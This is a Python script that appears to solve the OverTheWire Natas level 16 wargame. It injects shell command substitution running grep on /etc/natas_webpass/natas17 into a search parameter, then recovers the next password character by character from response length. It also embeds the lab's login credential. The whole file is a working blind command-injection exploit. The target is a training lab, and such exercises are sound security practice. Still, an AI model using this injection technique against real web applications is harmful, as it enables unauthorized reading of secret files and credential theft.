import requests
import string

url = "http://natas16.natas.labs.overthewire.org"
auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

chars = string.ascii_letters + string.digits
password = ""

while True:
    found = False

    for c in chars:
        attempt = password + c
        payload = f'$(grep ^{attempt} /etc/natas_webpass/natas17)'

        response = requests.get(url, params={"needle": payload}, auth=auth)
        length = len(response.text)

        print(f"Trying: {attempt} | Length: {length}")

        # 👇 adjust threshold based on your observations
        if length < 20000:
            password += c
            print(f"[+] Found: {password}")
            found = True
            break

    if not found:
        print(f"[✓] Password: {password}")
        break